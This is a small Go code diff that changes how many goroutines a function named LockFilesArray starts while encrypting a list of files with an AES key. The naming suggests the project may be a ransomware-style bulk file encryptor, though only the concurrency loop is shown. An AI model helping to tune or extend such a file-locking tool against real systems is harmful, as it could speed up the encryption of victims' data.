@@ -95,11 +95,10 @@ func LockFilesArray(filesToEncrypt []string, AESKey []byte) {
 	wg := sync.WaitGroup{}
 
 	// limit the number of goroutines
-	concurrencyLimit := numCPU * 2
 	filesProcessed := 0
-	for i := 0; i < len(filesToEncrypt); i += concurrencyLimit {
+	for i := 0; i < len(filesToEncrypt); i += numCPU {
 		// wait until there's room for another goroutine to start
-		for j := 0; j < concurrencyLimit && i+j < len(filesToEncrypt); j++ {
+		for j := 0; j < numCPU && i+j < len(filesToEncrypt); j++ {
 			wg.Add(1)
 			//TODO: Make an error chanel and listen to it
 			go func(index int) error {
